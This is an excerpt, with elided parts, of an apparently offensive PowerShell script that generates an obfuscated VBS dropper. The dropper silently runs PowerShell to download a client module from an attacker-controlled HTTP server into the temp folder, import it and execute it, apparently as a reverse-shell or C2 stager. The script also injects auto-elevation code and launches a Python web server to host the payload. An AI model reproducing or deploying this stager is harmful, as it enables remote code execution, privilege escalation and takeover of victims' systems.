...
$Obfuscation = $Local_Host.replace('.','i')       # 192i168i1i72
...
dIm Cmd,Buffer
Buffer=`"$Obfuscation`"
Cmd=rEpLaCe(Buffer, `"i`", `".`")

set ObjConsole = CreateObject(`"Wscript.Shell`")
ObjConsole.Run(`"powershell.exe cd `$Env:TMP;iwr -Uri http://`"+Cmd+`":${serverPort}/$ClientName -OutFile $ClientName;Import-Module -Name .\$ClientName -Force;$ClientRawn -c $Local_Host -e $Execute -p $PayloadPort -t $timeout`"), 0
}")
...
If($Python_version)
{
   ...
   If($Force -ieq "True")
   {
      ...
      ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n$SamplesSubmition")|Set-Content -Path $VbsName
   }
   If($Elevate -ieq "True")
   {
...
Else
{
   ...
   {
      Write-Host "  => vbs: auto-elevate client privileges." -ForegroundColor Yellow
      ((Get-Content -Path $VbsName -Raw) -Replace "powershell.exe","powershell.exe cd '`$pwd';")|Set-Content -Path $VbsName
      ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n`n$AutoElevation")|Set-Content -Path $VbsName
      ((Get-Content -Path $VbsName -Raw) -Replace "}","End If`n}")|Set-Content -Path $VbsName
      Start-Sleep -Milliseconds 600
   }
...
If($Python_version)
{
   ...
   Start-Process powershell -ArgumentList "cd $APACHE;python -m http.server $serverPort --bind $Local_Host"

   Write-Host "" #Attack Vector Uri
